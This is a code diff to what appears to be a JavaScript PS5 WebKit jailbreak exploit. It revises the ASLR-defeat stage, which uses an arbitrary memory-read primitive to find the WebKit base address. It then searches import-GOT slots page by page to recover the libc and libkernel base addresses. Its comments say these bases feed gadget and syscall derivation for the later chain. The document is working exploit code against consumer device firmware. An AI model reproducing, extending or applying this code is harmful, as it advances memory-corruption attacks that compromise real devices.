@@ -155,11 +155,14 @@ async function prepare(p) {
     let textAreaVtable = p.read8(textAreaVtPtr);
 
     // 9.00+ has no vtable rva; resolve from the host constructor instead.
+    // The gate is "does this profile ship candidates", NOT a firmware number:
+    // 7.00's profile ships them too, and on a live 7.00 devkit the ctor path
+    // (0x83460cae8 - 0x10AE8) reproduced the vtable path's base 0x8345fc000
+    // exactly. Profiles without candidates still fall back to the vtable rva.
     // A candidate is accepted only if it lands page-aligned in the user-module
     // band, so a wrong one is rejected rather than used.
     let libSceNKWebKitBase = null;
-    if (window.fw_float >= 9.00
-        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
+    if (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
         && OFFSET_wk_host_constructor_candidates.length
         && typeof globalThis.__ps5NativeCtor === "number") {
         const ctor = globalThis.__ps5NativeCtor;
@@ -199,11 +202,63 @@ async function prepare(p) {
         libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
     }
 
-    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
-    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
+    /* Import-GOT slot resolution, with a page-bias search.
+       ------------------------------------------------------------------
+       The offsets/*.js profiles marked "generated from libSceNKWebKit ..."
+       take these slot RVAs straight from DT_JMPREL/DT_RELA r_offset. That is
+       a *file*-derived number and it does not always survive the loader: the
+       two PT_LOADs are mapped with their own alignment padding, so every
+       data-segment RVA can be off by a whole number of 16KB pages. Measured
+       on a 7.00 devkit, both slots sat exactly one page above r_offset -- the
+       raw values read back WebKit-internal .data.rel.ro pointers instead, and
+       every gadget and syscall was then derived from a garbage base with no
+       usable error (lk=0x835778020 / lc=0x8356fcd00, neither page-aligned).
 
-    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
-    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
+       So: try the profile's value first, then walk outward page by page and
+       take the first slot whose contents actually look like a module base.
+       A candidate has to be 16KB-aligned, sit in the user-module band, and
+       land OUTSIDE the part of libSceNKWebKit we already know is mapped
+       ([wkBase, wkBase+slotRva]) -- a real libkernel/libc pointer cannot
+       point back into WebKit's own image. That last test is what rejects the
+       .data.rel.ro reads, which alignment alone does not. */
+    const MODULE_BAND_LO = 0x800000000, MODULE_BAND_HI = 0x900000000;
+    const wkNum = libSceNKWebKitBase.hi * 0x100000000 + libSceNKWebKitBase.low;
+
+    function resolve_module_base(slotRva, symOffset, label) {
+        const wkTop = wkNum + slotRva;
+        let firstSeen = null;
+        for (let page = 0; page <= 8; page++) {
+            for (const dir of (page === 0 ? [0] : [1, -1])) {
+                const rva = slotRva + dir * page * 0x4000;
+                if (rva < 0) continue;
+                const slotVal = p.read8(libSceNKWebKitBase.add32(rva));
+                const base = slotVal.sub32(symOffset);
+                const n = base.hi * 0x100000000 + base.low;
+                if (page === 0) firstSeen = n;
+                if (n % 0x4000 !== 0) continue;
+                if (n < MODULE_BAND_LO || n >= MODULE_BAND_HI) continue;
+                if (n >= wkNum && n <= wkTop) continue;   // points back into WebKit
+                if (page !== 0)
+                    jbmark("GOT-PAGE-BIAS", label + "-profile=0x" + slotRva.toString(16)
+                        + "-real=0x" + rva.toString(16)
+                        + "-bias=" + (rva - slotRva >= 0 ? "+" : "-")
+                        + "0x" + Math.abs(rva - slotRva).toString(16)
+                        + " (fix offsets/" + window.fw_str + ".js)");
+                return base;
+            }
+        }
+        throw new Error("fw " + window.fw_str + ": no import GOT slot for " + label
+            + " within +-8 pages of profile rva 0x" + slotRva.toString(16)
+            + " gave a plausible module base (profile value derived 0x"
+            + (firstSeen === null ? "?" : firstSeen.toString(16))
+            + "). The profile's slot rva is wrong, not just page-biased.");
+    }
+
+    let libSceLibcInternalBase = resolve_module_base(
+        OFFSET_wk_memset_import, OFFSET_lc_memset, "lc/memset");
+    let libKernelBase = resolve_module_base(
+        OFFSET_wk___stack_chk_guard_import, OFFSET_lk___stack_chk_guard,
+        "lk/__stack_chk_guard");
 
     // once per run, before any racer exists
     jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
